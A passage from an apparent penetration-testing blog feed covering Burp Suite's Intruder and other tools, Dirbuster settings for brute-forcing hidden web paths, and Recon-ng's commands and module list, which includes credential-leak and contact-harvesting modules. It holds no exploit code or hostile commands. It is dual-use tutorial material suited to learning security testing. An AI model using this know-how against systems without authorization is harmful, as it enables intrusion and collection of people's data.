<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/scanner.png" title="burp scanner" alt="burp web scanner"></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/intruder-position.png" title="intruder positions" alt="intruder payload positions"></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters&#8217; case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/repeater.png" title="repeater" alt="repeater"></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sequencer.png" title="Burp sequencer" alt="Burp sequencer"></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/decoder.png" title="Burp decoder" alt="Burp decoder"></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/comparer.png" title="Burp comparer" alt="Burp comparer"></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/extensions.png" title="burp extensions" alt="burp extensions"></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/clickbandit.png" title="burp clickbandit" alt="burp clickbandit"></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't you wish you had more energy... \
</span><span class='line'>\ or less ambition?                     /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Dirbuster]]></title>
    <link href="http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster/"/>
    <updated>2016-09-12T02:21:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>

<!-- more -->


<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>

<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster.png" title="dirbuster" alt="dirbuster interface"></p>

<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>

<h1>Dirbuster configuration</h1>

<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-lists.png" title="dirbuster lists" alt="dirbuster default lists"></p>

<ul>
<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
</ul>


<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>

<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>

<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>

<h2>Dirbuster Options</h2>

<p>In the Options tab, you can further tweak your Dirbuster installation.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-options.png" title="dirbuster options" alt="dirbuster options"></p>

<ul>
<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
</ul>


<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>

<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-html.png" title="dirbuster html options" alt="dirbuster html parsing"></p>

<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-http.png" title="dirbuster http options" alt="dirbuster http options"></p>

<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-scan.png" title="dirbuster scan options" alt="dirbuster scan options"></p>

<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-results.png" title="dirbuster scan results" alt="dirbuster scan results"></p>

<p>You can also see the results in a tree view, for better readability:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-tree.png" title="dirbuster tree" alt="dirbuster tree results"></p>

<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Fine day for friends. So-so day for \
</span><span class='line'>\ you.                                /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Recon-ng]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
    <updated>2016-08-29T15:30:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>

<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>

<!-- more -->


<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/recon-ng.png" title="recon-ng" alt="recon-ng"></p>

<h1>Recon-ng core commands</h1>

<p>With the help menu, you can get an overview of what commands are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; help
</span><span class='line'>
</span><span class='line'>Commands (type [help|?] &lt;topic&gt;):
</span><span class='line'>---------------------------------
</span><span class='line'>add             Adds records to the database
</span><span class='line'>back            Exits the current context
</span><span class='line'>delete          Deletes records from the database
</span><span class='line'>exit            Exits the framework
</span><span class='line'>help            Displays this menu
</span><span class='line'>keys            Manages framework API keys
</span><span class='line'>load            Loads specified module
</span><span class='line'>pdb             Starts a Python Debugger session
</span><span class='line'>query           Queries the database
</span><span class='line'>record          Records commands to a resource file
</span><span class='line'>reload          Reloads all modules
</span><span class='line'>resource        Executes commands from a resource file
</span><span class='line'>search          Searches available modules
</span><span class='line'>set             Sets module options
</span><span class='line'>shell           Executes shell commands
</span><span class='line'>show            Shows various framework items
</span><span class='line'>snapshots       Manages workspace snapshots
</span><span class='line'>spool           Spools output to a file
</span><span class='line'>unset           Unsets module options
</span><span class='line'>use             Loads specified module
</span><span class='line'>workspaces      Manages workspaces</span></code></pre></td></tr></table></div></figure>


<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys list
</span><span class='line'>
</span><span class='line'>  +---------------------------+
</span><span class='line'>  |        Name       | Value |
</span><span class='line'>  +---------------------------+
</span><span class='line'>  | bing_api          |       |
</span><span class='line'>  | builtwith_api     |       |
</span><span class='line'>  | facebook_api      |       |
</span><span class='line'>  | facebook_password |       |
</span><span class='line'>  | facebook_secret   |       |
</span><span class='line'>  | facebook_username |       |
</span><span class='line'>  | flickr_api        |       |
</span><span class='line'>  | fullcontact_api   |       |
</span><span class='line'>  | google_api        |       |
</span><span class='line'>  | google_cse        |       |
</span><span class='line'>  | instagram_api     |       |
</span><span class='line'>  | instagram_secret  |       |
</span><span class='line'>  | ipinfodb_api      |       |
</span><span class='line'>  | jigsaw_api        |       |
</span><span class='line'>  | jigsaw_password   |       |
</span><span class='line'>  | jigsaw_username   |       |
</span><span class='line'>  | linkedin_api      |       |
</span><span class='line'>  | linkedin_secret   |       |
</span><span class='line'>  | pwnedlist_api     |       |
</span><span class='line'>  | pwnedlist_iv      |       |
</span><span class='line'>  | pwnedlist_secret  |       |
</span><span class='line'>  | shodan_api        |       |
</span><span class='line'>  | twitter_api       |       |
</span><span class='line'>  | twitter_secret    |       |
</span><span class='line'>  +---------------------------+</span></code></pre></td></tr></table></div></figure>


<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys add bing_api 007007
</span><span class='line'>[*] Key 'bing_api' added.
</span><span class='line'>[recon-ng][default] &gt; keys list
</span><span class='line'>
</span><span class='line'>  +----------------------------+
</span><span class='line'>  |        Name       | Value  |
</span><span class='line'>  +----------------------------+
</span><span class='line'>  | bing_api          | 007007 |</span></code></pre></td></tr></table></div></figure>


<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; show
</span><span class='line'>Shows various framework items
</span><span class='line'>
</span><span class='line'>Usage: show [banner|companies|contacts|credentials|dashboard|domains|hosts|leaks|locations|modules|netblocks|options|ports|profiles|pushpins|schema|vulnerabilities]</span></code></pre></td></tr></table></div></figure>


<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<h1>Recon-ng modules</h1>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>show modules
</span><span class='line'>
</span><span class='line'>  Discovery
</span><span class='line'>  ---------
</span><span class='line'>    discovery/info_disclosure/cache_snoop
</span><span class='line'>    discovery/info_disclosure/interesting_files
</span><span class='line'>
</span><span class='line'>  Exploitation
</span><span class='line'>  ------------
</span><span class='line'>    exploitation/injection/command_injector
</span><span class='line'>    exploitation/injection/xpath_bruter
</span><span class='line'>
</span><span class='line'>  Import
</span><span class='line'>  ------
</span><span class='line'>    import/csv_file
</span><span class='line'>    import/list
</span><span class='line'>
</span><span class='line'>  Recon
</span><span class='line'>  -----
</span><span class='line'>    recon/companies-contacts/facebook
</span><span class='line'>    recon/companies-contacts/jigsaw/point_usage
</span><span class='line'>    recon/companies-contacts/jigsaw/purchase_contact
</span><span class='line'>    recon/companies-contacts/jigsaw/search_contacts
</span><span class='line'>    recon/companies-contacts/jigsaw_auth
</span><span class='line'>    recon/companies-contacts/linkedin_auth
</span><span class='line'>    recon/companies-multi/whois_miner
</span><span class='line'>    recon/companies-profiles/bing_linkedin
</span><span class='line'>    recon/contacts-contacts/mailtester
</span><span class='line'>    recon/contacts-contacts/mangle
</span><span class='line'>    recon/contacts-contacts/unmangle
</span><span class='line'>    recon/contacts-credentials/hibp_breach
</span><span class='line'>    recon/contacts-credentials/hibp_paste
</span><span class='line'>    recon/contacts-credentials/pwnedlist
</span><span class='line'>    recon/contacts-domains/migrate_contacts
</span><span class='line'>    recon/contacts-profiles/fullcontact
</span><span class='line'>    recon/credentials-credentials/adobe
</span><span class='line'>    recon/credentials-credentials/bozocrack
</span><span class='line'>    recon/credentials-credentials/hashes_org
</span><span class='line'>    recon/credentials-credentials/leakdb
</span><span class='line'>    recon/domains-contacts/pgp_search
</span><span class='line'>    recon/domains-contacts/salesmaple
</span><span class='line'>    recon/domains-contacts/whois_pocs
</span><span class='line'>    recon/domains-credentials/pwnedlist/account_creds
</span><span class='line'>    recon/domains-credentials/pwnedlist/api_usage
</span><span class='line'>    recon/domains-credentials/pwnedlist/domain_creds
</span><span class='line'>    recon/domains-credentials/pwnedlist/domain_ispwned
</span><span class='line'>    recon/domains-credentials/pwnedlist/leak_lookup
</span><span class='line'>    recon/domains-credentials/pwnedlist/leaks_dump
</span><span class='line'>    recon/domains-domains/brute_suffix
</span><span class='line'>    recon/domains-hosts/baidu_site
</span><span class='line'>    recon/domains-hosts/bing_domain_api
</span><span class='line'>    recon/domains-hosts/bing_domain_web
</span><span class='line'>    recon/domains-hosts/brute_hosts
</span><span class='line'>    recon/domains-hosts/builtwith
</span><span class='line'>    recon/domains-hosts/google_site_api
</span><span class='line'>    recon/domains-hosts/google_site_web
</span><span class='line'>    recon/domains-hosts/netcraft
</span><span class='line'>    recon/domains-hosts/shodan_hostname
</span><span class='line'>    recon/domains-hosts/ssl_san
</span><span class='line'>    recon/domains-hosts/vpnhunter
</span><span class='line'>    recon/domains-hosts/yahoo_domain
</span><span class='line'>    recon/domains-vulnerabilities/punkspider
</span><span class='line'>    recon/domains-vulnerabilities/xssed
</span><span class='line'>    recon/domains-vulnerabilities/xssposed
</span><span class='line'>    recon/hosts-domains/migrate_hosts
</span><span class='line'>    recon/hosts-hosts/bing_ip
</span><span class='line'>    recon/hosts-hosts/freegeoip
</span><span class='line'>    recon/hosts-hosts/ip_neighbor
</span><span class='line'>    recon/hosts-hosts/ipinfodb
</span><span class='line'>    recon/hosts-hosts/resolve
</span><span class='line'>    recon/hosts-hosts/reverse_resolve
</span><span class='line'>    recon/locations-locations/geocode
</span><span class='line'>    recon/locations-locations/reverse_geocode
</span><span class='line'>    recon/locations-pushpins/flickr
</span><span class='line'>    recon/locations-pushpins/instagram
</span><span class='line'>    recon/locations-pushpins/picasa
</span><span class='line'>    recon/locations-pushpins/shodan
</span><span class='line'>    recon/locations-pushpins/twitter
</span><span class='line'>    recon/locations-pushpins/youtube
</span><span class='line'>    recon/netblocks-companies/whois_orgs
</span><span class='line'>    recon/netblocks-hosts/reverse_resolve
</span><span class='line'>    recon/netblocks-hosts/shodan_net
</span><span class='line'>    recon/netblocks-ports/census_2012
</span><span class='line'>    recon/ports-hosts/migrate_ports
</span><span class='line'>    recon/profiles-contacts/dev_diver
</span><span class='line'>    recon/profiles-contacts/linkedin
</span><span class='line'>    recon/profiles-profiles/linkedin_crawl
</span><span class='line'>    recon/profiles-profiles/namechk
</span><span class='line'>    recon/profiles-profiles/profiler
</span><span class='line'>    recon/profiles-profiles/twitter
</span><span class='line'>
</span><span class='line'>  Reporting
</span><span class='line'>  ---------
</span><span class='line'>    reporting/csv
</span><span class='line'>    reporting/html
</span><span class='line'>    reporting/json
</span><span class='line'>    reporting/list
</span><span class='line'>    reporting/pushpin
</span><span class='line'>    reporting/xlsx
</span><span class='line'>    reporting/xml</span></code></pre></td></tr></table></div></figure>


<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>


<p>Let&rsquo;s see more about this module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][interesting_files] &gt; show info
</span><span class='line'>
</span><span class='line'>      Name: Interesting File Finder
</span><span class='line'>      Path: modules/discovery/info_disclosure/interesting_files.py
</span><span class='line'>    Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Checks hosts for interesting files in predictable locations.
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  Name      Current Value  Required  Description
